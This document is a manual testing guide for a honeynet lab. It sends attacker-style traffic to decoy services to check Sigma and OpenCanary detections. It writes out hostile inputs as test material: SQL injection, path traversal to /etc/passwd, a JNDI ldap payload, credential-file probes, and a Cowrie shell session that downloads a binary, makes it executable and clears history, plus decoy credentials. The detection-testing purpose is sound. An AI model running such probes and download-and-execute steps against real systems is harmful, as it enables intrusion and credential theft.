# Attack Testing Guide

This is the short manual test path for the VM at `146.169.44.23`.

Use real host-facing requests from your browser or terminal. Avoid `docker run --network ...` for attacker traffic because it creates Docker bridge source IPs and noisy attacker records.

Most manual commands use the top-level shell scripts in `scripts/`. Python helpers now live under role-based folders such as `scripts/forwarders/`, `scripts/validation/`, `scripts/reports/`, `scripts/runtime/`, and `scripts/data/`.

## 1. Start Clean

```bash
./scripts/reset_enterprise_runtime.sh
./scripts/start_enterprise_stack.sh
```

Open the dashboard locally or through an SSH tunnel:

```bash
ssh -N \
  -L 18000:146.169.44.23:8080 \
  -L 18090:146.169.44.23:8090 \
  -L 18180:146.169.44.23:18080 \
  -L 19418:146.169.44.23:19418 \
  -L 13306:146.169.44.23:13306 \
  -L 16379:146.169.44.23:16379 \
  -L 18089:146.169.44.23:18081 \
  -L 12121:146.169.44.23:12121 \
  -L 12222:146.169.44.23:12222 \
  -L 12323:146.169.44.23:12323 \
  -L 12525:146.169.44.23:2525 \
  -L 18082:146.169.44.23:18082 \
  -L 18084:146.169.44.23:18084 \
  -L 18085:146.169.44.23:18085 \
  -L 18443:146.169.44.23:18443 \
  vm
```

Then open:

```text
http://localhost:18090/
```

Tunnel notes: public portal is `localhost:18000`, dashboard is `localhost:18090`, internal portal is `localhost:18180`, web admin is `localhost:18089`, SMTP is `localhost:12525`, and the other protocol tunnels keep their VM port numbers.

## 2. Check Public Surface

```bash
curl -i "http://146.169.44.23:8080/"
curl -i "http://146.169.44.23:8080/login.html"
curl -i "http://146.169.44.23:8080/docs.html"
curl -i "http://146.169.44.23:8080/support.html"
curl -i "http://146.169.44.23:8080/status.html"
curl -i "http://146.169.44.23:8080/robots.txt"
curl -i "http://146.169.44.23:8080/.env.old"
curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt"
curl -i "http://146.169.44.23:8080/assets/app.js.map"
curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak"
curl -i "http://146.169.44.23:8080/phpinfo.php"
curl -s "http://146.169.44.23:8090/api/summary" | jq '.metrics, .chain_health'
```

Expected:

- `8080` returns the public portal
- `8090` dashboard is healthy
- public-surface requests appear in dashboard observations after a short delay

## 3. Generate Public Attacker Signals

These requests should be classified by HTTP Sigma rules from `data/detections/http_sigma`.

```bash
curl -i "http://146.169.44.23:8080/.env.old"
curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak"
curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt"
curl -i "http://146.169.44.23:8080/assets/app.js.map"
curl -i "http://146.169.44.23:8080/admin"
curl -i "http://146.169.44.23:8080/.git/config"
curl -i "http://146.169.44.23:8080/server-status"
curl -i "http://146.169.44.23:8080/wp-admin/"
curl -i "http://146.169.44.23:8080/graphql"
curl -i "http://146.169.44.23:8080/phpinfo.php"
curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword"
curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201"
curl -i "http://146.169.44.23:8080/internal-api/status"
curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd"
curl -i "http://146.169.44.23:8080/debug?url=ldap://example.test/a"
curl -i "http://146.169.44.23:8080/actuator/env"
curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D"
sleep 2
curl -s "http://146.169.44.23:8090/api/summary" | jq '.recent_entrypoint_observations | map({attacker_key, path, matched_rules, indicators, profiler_evidence_ids}), .attackers | map({attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets})'
```

Expected:

- suspicious paths get `matched_rules`
- profile shows ATT&CK tactics/techniques
- adaptive loop may unlock `internal-portal` first
- the added `/internal-api/status`, traversal, `ldap://`, actuator, and JNDI-style probes satisfy the current `ics-plc`, `malware-sink`, and exploit-probe unlock requirements

## 4. Test Cowrie SSH Detection

Use this section to check whether commands typed inside Cowrie become profile evidence. Do not edit rules during this test.

Start the stack in the mode you want to test. For Sigma modes, make sure `vendor/sigma` exists using the README setup command.

```bash
# default Sigma command detection
./scripts/start_enterprise_stack.sh
```

Connect to Cowrie:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23
```

Inside the shell:

```bash
whoami
id
uname -a
cat /etc/passwd
curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin
chmod +x /tmp/agent-update.bin
history -c
exit
```

Expected Sigma command mapping for the current `vendor/sigma/rules/linux` path. The dashboard may show extra techniques if the upstream Sigma checkout adds broader matches, but these should appear at minimum:

| Command | Expected technique |
| --- | --- |
| `whoami` | `T1033` |
| `id` | `T1033`, `T1087.001` |
| `uname -a` | `T1033`, `T1082` |
| `cat /etc/passwd` | `T1087.001` |
| `curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin` | `T1105` |
| `chmod +x /tmp/agent-update.bin` | `T1222.002` |
| `history -c` | `T1070.003` |

Check:

```bash
sleep 2
curl -s "http://146.169.44.23:8090/api/summary" | jq '
{
  cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}],
  attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]
}'
```

Expected:

- `cowrie.command.input` events appear under `cowrie`
- mapped commands have non-empty `profiler_evidence_ids`
- `attackers[].commands` includes the commands typed in Cowrie
- `recent_tactics` and `recent_techniques` update when detection succeeds
- in Sigma-only mode, coverage depends on compatible Sigma YAML selections under `vendor/sigma/rules/linux`

## 5. Strict Gateway Test

This confirms an internal port only works for the same source IP that unlocked it.

```bash
curl -i --max-time 3 "http://146.169.44.23:18080/" || true

SOURCE_IP="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | map(select(.path == "/.env.old")) | .[0].attacker_key // empty'
)"
echo "$SOURCE_IP"

for _ in $(seq 1 20); do
  jq --arg ip "$SOURCE_IP" -c \
    '.routes | map(select(.attacker_key == $ip and .asset_id == "internal-portal" and .public_port == 18080))' \
    data/runtime/asset_gateway_routes.json
  curl -i --max-time 3 "http://146.169.44.23:18080/" && break
  sleep 2
done
```

Expected:

- before unlock, `18080` should fail, close, or return non-portal content
- after route exists for the same source IP, `18080` returns the internal portal

## 6. Unlock Internal Assets

If you want to test the controller's natural unlock path first, wait for the adaptive loop after section 3:

```bash
for _ in $(seq 1 30); do
  curl -s "http://146.169.44.23:8090/api/summary" | jq '.attackers | map({attacker_key, recent_tactics, recent_techniques, unlocked_assets})'
  sleep 2
done
```

Use this when you want to inspect every fixed-port internal asset without waiting for the controller to choose them naturally. This opens the asset-gateway assets; the main Cowrie SSH entrypoint is tested in section 4, and compose/Vulhub-only assets are not part of the default fixed-port test path.

```bash
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"
echo "$TEST_ATTACKER_KEY"
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh
sleep 3
curl -s "http://146.169.44.23:8090/api/summary" | jq '.asset_gateway_routes'
```

## 7. Per-Port Information Retrieval

Run these after section 6 from the same source IP.

```bash
TEST_ATTACKER_KEY="${TEST_ATTACKER_KEY:-146.169.44.23}"

# Wait until all fixed-port internal assets have an asset-gateway route for this source IP.
for _ in $(seq 1 30); do
  ROUTED_COUNT="$(
    jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique | length' \
      data/runtime/asset_gateway_routes.json
  )"
  echo "routed assets: $ROUTED_COUNT"
  [ "$ROUTED_COUNT" -ge 13 ] && break
  sleep 2
done

# internal-portal
curl -i "http://146.169.44.23:18080/" || true
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true

# git-internal: current runtime records Git probes.
timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true
timeout 8s git ls-remote git://146.169.44.23:19418/customer-portal.git || true
# local sanity only: seed repo content prepared for the later cloneable runtime.
find deploy/internal-assets/git-internal/seed -maxdepth 3 -type f | sort

# ops-db: OpenCanary MySQL needs a real MySQL login packet. Raw `nc` is only a TCP check and usually will not create login telemetry.
python3 - <<'PY'
import socket
import struct

host = "146.169.44.23"
port = 13306
username = b"backup_reader"
password = b"WrongPassword"

try:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY

# redis-cache
printf "INFO\r\n" | nc -w 2 146.169.44.23 16379 || true
printf "KEYS *\r\n" | nc -w 2 146.169.44.23 16379 || true
# local sanity only: OpenCanary Redis records probes but does not serve real key values.
cat deploy/internal-assets/redis-cache/seed/keys.txt

# web-admin-console
curl -i "http://146.169.44.23:18081/" || true
curl -i "http://146.169.44.23:18081/admin" || true
curl -i "http://146.169.44.23:18081/api/status" || true
curl -i "http://146.169.44.23:18081/api/users?role=admin" || true

# ftp / ssh / telnet / smtp
printf "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc -w 3 146.169.44.23 12121 || true
timeout 8s ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 || true
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 146.169.44.23 12323 || true
printf "EHLO tester\r\nVRFY admin\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 || true

# finance-share
curl -i "http://146.169.44.23:18082/" || true
curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true
curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true
curl -i "http://146.169.44.23:18082/finance/archive/2024/vendor-bank-change.csv" || true
curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true

# ics-plc: `18084` is the internal plant PLC status asset. It exposes an engineering panel, PLC config backup, and Modbus map.
curl -i "http://146.169.44.23:18084/" || true
curl -i "http://146.169.44.23:18084/config/plc-backup-2026-04.cfg" || true
curl -i "http://146.169.44.23:18084/maps/modbus-unit-map.csv" || true

# vpn-appliance: direct downloads should require credentials.
curl -i "http://146.169.44.23:18443/" || true
curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/logs/vpn-auth.log" || true
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true

# malware-sink: `18085` is the internal package drop-zone asset. It exposes upload notes and a downloadable agent update artifact.
curl -i "http://146.169.44.23:18085/" || true
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true
curl -i "http://146.169.44.23:18085/upload/README.txt" || true
```

Check result:

```bash
curl -s "http://146.169.44.23:8090/api/summary" | jq '.asset_gateway_routes, .recent_opencanary_observations, .attackers'
curl -s "http://146.169.44.23:8090/api/summary" | jq '.attackers | map({attacker_key, recent_internal_http_paths, recent_internal_http_rules, internal_http_evidence})'
curl -s "http://146.169.44.23:8090/api/summary" | jq '.attackers | map({attacker_key, recent_tactics, recent_techniques, unlocked_assets})'
```

Notes:

- `mail-relay` uses Mailoney, so SMTP commands are observed by `asset-gateway` and forwarded through `internal-protocol-forwarder` into OpenCanary-style observations.
- MySQL and Telnet need protocol-shaped interaction to produce useful OpenCanary records; raw `nc` is mostly a route check.
- Git, SSH, Redis, and FTP should appear under `recent_opencanary_observations` after a short delay.
- The internal portal `/session` POST is a real gateway-validated credential step. Wrong token returns `401`; the leaked `portal.reader` token returns `200` and should create internal login/token-reuse evidence.
- Static internal HTTP assets are observed by `asset-gateway`, written to `data/runtime/internal_http_events.jsonl`, then forwarded by `internal-http-forwarder`, so artifact paths such as `.zip`, `.bak`, `.cfg`, `.ovpn`, and `.bin` should appear as internal HTTP evidence.

## 8. Useful Debug Commands

```bash
docker-compose -p honeynet -f docker-compose.control.yml ps
docker-compose -p honeynet -f docker-compose.enterprise.yml ps
docker logs --tail 50 honeynet_public-portal-forwarder_1
docker logs --tail 50 honeynet_internal-http-forwarder_1
docker logs --tail 50 honeynet_internal-protocol-forwarder_1
docker logs --tail 50 honeynet_entrypoint-observer_1
docker logs --tail 50 honeynet_opencanary-forwarder_1
tail -n 20 deploy/public-portal/logs/access.log
tail -n 20 data/runtime/internal_http_events.jsonl
tail -n 20 data/runtime/internal_protocol_events.jsonl
cat data/runtime/asset_gateway_routes.json | jq
```

## 9. Cleanup

```bash
./scripts/reset_enterprise_runtime.sh
```
